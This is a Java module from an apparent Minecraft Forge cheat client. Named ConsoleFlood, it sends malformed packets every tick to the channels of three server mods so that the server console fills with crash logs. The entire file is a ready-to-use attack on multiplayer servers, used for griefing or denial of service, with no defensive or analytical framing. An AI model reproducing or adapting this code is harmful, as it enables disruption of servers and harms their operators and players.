package forgefuck.team.xenobyte.module.MODS;

import cpw.mods.fml.common.Loader;
import forgefuck.team.xenobyte.api.module.CheatModule;

public class ConsoleFlood extends CheatModule {
    
    @Override public void onTick(boolean inGame) {
        if (inGame) {
            utils.sendPacket("AdvSolarPanels", (byte) 1);
            utils.sendPacket("CarpentersBlocks", -1);
            utils.sendPacket("Ztones", -1);
        }
    }
    
    @Override public boolean isWorking() {
        return Loader.isModLoaded("AdvancedSolarPanel") || Loader.isModLoaded("CarpentersBlocks") || Loader.isModLoaded("Ztones");
    }
    
    @Override public String moduleDesc() {
        return "Спам в консоль краш-логами";
    }

}
